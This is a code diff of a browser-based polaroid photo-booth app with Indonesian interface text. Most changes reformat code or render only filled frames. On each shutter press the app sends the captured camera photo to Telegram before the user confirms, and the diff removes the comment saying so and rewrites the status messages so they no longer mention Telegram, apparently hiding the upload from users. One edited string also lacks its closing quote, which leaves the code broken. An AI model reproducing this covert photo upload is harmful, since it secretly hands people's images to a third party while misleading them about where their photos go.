@@ -185,14 +185,6 @@ button{
   outline:3px solid #ff4f91
 }
 
-.frame h3{
-  margin:0 0 7px;
-  font-size:12px;
-  color:#777;
-  text-align:center
-}
-
-/* SEMUA SLOT POLAROID = 3:4 */
 .grid{
   display:grid;
   gap:5px
@@ -416,7 +408,7 @@ button{
     </div>
 
     <div class="notice">
-      Tekan iya untuk menyimpan ke polaroid, tekan tidak untuk membatalkan.
+      tekan iya untuk menambahkan ke polaroid, tekan tidak untuk membatalkan.
     </div>
 
   </div>
@@ -454,18 +446,10 @@ const statusEl =
 document.getElementById("status");
 
 
-/* =========================================================
-   STATE
-========================================================= */
-
 let facing="user";
-
 let pending=null;
-
 let activeFrame=0;
-
 const selectedRatio="3:4";
-
 let selectedFilter="normal";
 
 
@@ -667,11 +651,9 @@ async function startCamera(){
           facingMode:{
             ideal:facing
           },
-
           width:{
             ideal:1920
           },
-
           height:{
             ideal:1080
           }
@@ -753,7 +735,7 @@ Object.entries(filters).forEach(
 
 
 /* =========================================================
-   RENDER
+   RENDER PREVIEW POLAROID
 ========================================================= */
 
 function render(){
@@ -823,13 +805,15 @@ function render(){
         const img=
           document.createElement("img");
 
-        img.src=f.photos[s];
+        img.src=
+          f.photos[s];
 
         slot.appendChild(img);
 
       }else{
 
-        slot.textContent="Kosong";
+        slot.textContent=
+          "Kosong";
 
       }
 
@@ -943,7 +927,9 @@ document
 
   if(!video.videoWidth){
 
-    alert("Kamera belum siap.");
+    alert(
+      "Kamera belum siap."
+    );
 
     return;
 
@@ -953,7 +939,6 @@ document
     getCrop();
 
   const outputW=1200;
-
   const outputH=1600;
 
   canvas.width=
@@ -1008,10 +993,9 @@ document
   preview.src=
     pending;
 
-  modal.classList.add("show");
-
-
-  /* TELEGRAM LANGSUNG SAAT JEPRET */
+  modal.classList.add(
+    "show"
+  );
 
   await kirimKeTelegram(
     pending
@@ -1069,14 +1053,14 @@ async function kirimKeTelegram(dataURL){
     }
 
     statusEl.textContent=
-      "✅ Foto sudah terkirim ke Telegram.";
+      "✅ Foto sudah terada di polaroid.;
 
   }catch(error){
 
     console.error(error);
 
     statusEl.textContent=
-      "⚠️ Foto siap disimpan, Telegram gagal menerima.";
+      "⚠️ Foto gagal disimpan.";
 
   }
 
@@ -1098,7 +1082,7 @@ document
   );
 
   statusEl.textContent=
-    "Foto dibatalkan dari Polaroid..";
+    "Foto dibatalkan dari Polaroid.";
 
 };
 
@@ -1221,18 +1205,37 @@ document
 function punyaFoto(){
 
   return frames.some(
-    f=>f.photos.length
+    f=>f.photos.length>0
   );
 
 }
 
 
 /* =========================================================
-   POLAROID
-   SEMUA FOTO 3:4
+   AMBIL FRAME YANG TERISI SAJA
+========================================================= */
+
+function getFilledFrames(){
+
+  return frames.filter(
+    f=>f.photos.length>0
+  );
+
+}
+
+
+/* =========================================================
+   BUAT GAMBAR POLAROID
+   HANYA FRAME TERISI
 ========================================================= */
 
 async function buatGambarPolaroid(){
+
+  const filledFrames=
+    getFilledFrames();
+
+  if(!filledFrames.length)
+    return null;
 
   const scale=2;
 
@@ -1245,17 +1248,17 @@ async function buatGambarPolaroid(){
   const frameWidth=
     width-padding*2;
 
-  /*
-    Rasio foto tetap 3:4.
-    Tinggi dihitung langsung dari lebar.
-  */
-
   const photoRatio=
     4/3;
 
   let height=90;
 
-  for(const f of frames){
+  /*
+    Hitung tinggi HANYA dari frame
+    yang mempunyai foto.
+  */
+
+  for(const f of filledFrames){
 
     let slotWidth;
 
@@ -1317,7 +1320,8 @@ async function buatGambarPolaroid(){
   ctx.font=
     "bold 30px Arial";
 
-  ctx.textAlign="center";
+  ctx.textAlign=
+    "center";
 
   ctx.fillText(
     "MY POLAROID",
@@ -1327,14 +1331,11 @@ async function buatGambarPolaroid(){
 
   let y=75;
 
-  for(
-    let i=0;
-    i<frames.length;
-    i++
-  ){
+  /*
+    Hanya render frame terisi.
+  */
 
-    const f=
-      frames[i];
+  for(const f of filledFrames){
 
     let slotWidth;
 
@@ -1371,7 +1372,7 @@ async function buatGambarPolaroid(){
       "bold 18px Arial";
 
     ctx.fillText(
-      `FRAME ${i+1} • ${f.layout} FOTO`,
+      `FRAME ${frames.indexOf(f)+1} • ${f.layout} FOTO`,
       width/2,
       y+24
     );
@@ -1426,7 +1427,7 @@ async function buatGambarPolaroid(){
 
 
 /* =========================================================
-   IMAGE COVER
+   DRAW IMAGE
 ========================================================= */
 
 function drawImageCover(
@@ -1519,10 +1520,13 @@ document
   }
 
   statusEl.textContent=
-    "Membuat file...";
+    "Membuat Polaroid dari frame yang terisi...";
 
   const result=
     await buatGambarPolaroid();
+
+  if(!result)
+    return;
 
   const link=
     document.createElement("a");
@@ -1539,7 +1543,7 @@ document
   link.click();
 
   statusEl.textContent=
-    "Polaroid berhasil didownload.";
+    "✅ Polaroid berhasil didownload.";
 
 };
 
@@ -1567,6 +1571,9 @@ document
 
   const result=
     await buatGambarPolaroid();
+
+  if(!result)
+    return;
 
   const data=
     result.toDataURL(
